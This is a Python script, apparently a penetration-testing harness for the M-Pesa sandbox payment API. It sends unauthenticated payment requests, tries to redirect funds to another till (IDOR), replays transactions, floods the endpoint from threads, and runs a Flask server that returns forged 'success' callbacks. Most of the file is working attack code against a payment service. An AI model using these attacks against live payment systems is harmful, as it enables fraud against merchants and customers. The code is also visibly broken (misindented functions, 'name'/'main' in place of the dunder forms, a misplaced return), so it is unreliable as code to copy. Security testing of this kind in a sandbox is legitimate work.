import requests
import hashlib
import time
import threading
from flask import Flask, jsonify

BASE_URL = "https://sandbox.safaricom.co.ke"  # M-Pesa sandbox URL
TILL_NUMBER = "123456"  # Dummy till number for testing
CONSUMER_KEY = "your_test_consumer_key"  # Sandbox credentials
CONSUMER_SECRET = "your_test_consumer_secret"  # Sandbox credentials
TEST_PHONE = "254712345678"  # Test phone number (format: 254...)
CALLBACK_URL = "http://your-callback-server.com/callback"  # For simulating callbacks

def get_access_token():
	"""Fetch OAuth access token for API authentication."""
	auth_url = f"{BASE_URL}/oauth/v1/generate?grant_type=client_credentials"
	response = requests.get(
		auth_url,
		auth=(CONSUMER_KEY, CONSUMER_SECRET),
		headers={"Content-Type": "application/json"}
	)
	return response.json().get("access_token")

def generate_password(shortcode):
	"""Generate a mock password (replace with actual logic if needed)."""
	timestamp = time.strftime("%Y%m%d%H%M%S")
	return hashlib.sha256(f"{shortcode}your_passkey{timestamp}".encode()).hexdigest()

#test 1 AUTHENTICATION BYPASS
def test_auth_bypass(till_number, phone, amount):
"""Attempt to send a payment without proper authentication."""
url = f"{BASE_URL}/mpesa/stkpush/v1/processrequest"
payload = {
"BusinessShortCode": till_number,
"TransactionType": "CustomerPayBillOnline",
"Amount": amount,
"PartyA": phone,
"PartyB": till_number,
"PhoneNumber": phone,
}
response = requests.post(url, json=payload)
return response.json()

#Test 2 IDOR (Insecure Direct Object Reference)
def test_idor(original_till, target_till, phone, amount):
	"""Test if transactions can be redirected to another till."""
	access_token = get_access_token()
	if not access_token:
		return {"error": "Authentication failed"}
	payload = {
		"BusinessShortCode": original_till,
		"Password": generate_password(original_till),
		"Timestamp": time.strftime("%Y%m%d%H%M%S"),
		"TransactionType": "CustomerPayBillOnline",
		"Amount": amount,
		"PartyA": phone,
		"PartyB": target_till,  # Attempt to redirect funds
		"PhoneNumber": phone,
		"CallBackURL": CALLBACK_URL,
		"AccountReference": "IDOR_TEST",
	}
	headers = {"Authorization": f"Bearer {access_token}", "Content-Type": "application/json"}
	response = requests.post(f"{BASE_URL}/mpesa/stkpush/v1/processrequest", json=payload, headers=headers)
	return response.json()

#Test 3: REPLAY ATTACK SIMULATION
def replay_attack(till_number, phone, amount, repeat=3):
	"""Simulate replaying the same transaction multiple times."""
access_token = get_access_token()
if not access_token:
return {"error": "Authentication failed"}
payload = {
    "BusinessShortCode": till_number,
    "Password": generate_password(till_number),
    "Timestamp": time.strftime("%Y%m%d%H%M%S"),
    "TransactionType": "CustomerPayBillOnline",
    "Amount": amount,
    "PartyA": phone,
    "PartyB": till_number,
    "PhoneNumber": phone,
    "CallBackURL": CALLBACK_URL,
    "AccountReference": "REPLAY_TEST",
}
headers = {"Authorization": f"Bearer {access_token}", "Content-Type": "application/json"}

results = []
for _ in range(repeat):
    response = requests.post(f"{BASE_URL}/mpesa/stkpush/v1/processrequest", json=payload, headers=headers)
    results.append(response.json())
return results

#test 4 rate limiting and brute force 
def spam_transactions(till_number, phone, amount, count=5):
"""Flood the system with rapid transactions to test rate limiting."""
access_token = get_access_token()
if not access_token:
return {"error": "Authentication failed"}
def send_transaction():
    payload = {
        "BusinessShortCode": till_number,
        "Password": generate_password(till_number),
        "Timestamp": time.strftime("%Y%m%d%H%M%S"),
        "TransactionType": "CustomerPayBillOnline",
        "Amount": amount,
        "PartyA": phone,
        "PartyB": till_number,
        "PhoneNumber": phone,
        "CallBackURL": CALLBACK_URL,
        "AccountReference": "FLOOD_TEST",
    }
    headers = {"Authorization": f"Bearer {access_token}", "Content-Type": "application/json"}
    response = requests.post(f"{BASE_URL}/mpesa/stkpush/v1/processrequest", json=payload, headers=headers)
    print(f"Response: {response.json()}")

threads = []
for _ in range(count):
    t = threading.Thread(target=send_transaction)
    threads.append(t)
    t.start()
for t in threads:
    t.join()
    return {"status": "Flooding completed"}

#test 5 Callback URL Manipulation
app = Flask(name)

@app.route("/callback", methods=["POST"])
def fake_callback():
"""Simulate a fake 'success' callback to trick the system."""
return jsonify({
"ResultCode": 0,
"ResultDesc": "Success",
"TransactionID": "fake123"
})

def run_callback_server():
    """Run a mock callback server in a separate thread."""
    app.run(port=5000, threaded=True)

#MAIN EXECUTION
if name == "main":
print("===== Starting Penetration Tests =====")
# Test 1: Authentication Bypass
print("\n[TEST 1] Authentication Bypass:")
print(test_auth_bypass(TILL_NUMBER, TEST_PHONE, "100"))

# Test 2: IDOR (Redirect Funds)
print("\n[TEST 2] IDOR (Insecure Direct Object Reference):")
print(test_idor(TILL_NUMBER, "654321", TEST_PHONE, "100"))  # Try redirecting to till 654321

# Test 3: Replay Attack
print("\n[TEST 3] Replay Attack:")
print(replay_attack(TILL_NUMBER, TEST_PHONE, "100", repeat=3))

# Test 4: Rate Limiting
print("\n[TEST 4] Rate Limiting (Check server logs for responses):")
spam_transactions(TILL_NUMBER, TEST_PHONE, "100", count=5)

# Test 5: Fake Callback Server (Run in background)
print("\n[TEST 5] Fake Callback Server (Run in a separate terminal):")
print("Use `flask run --port=5000` to start the callback server manually.")
# Uncomment to auto-start (may conflict with other Flask apps):
# threading.Thread(target=run_callback_server).start()


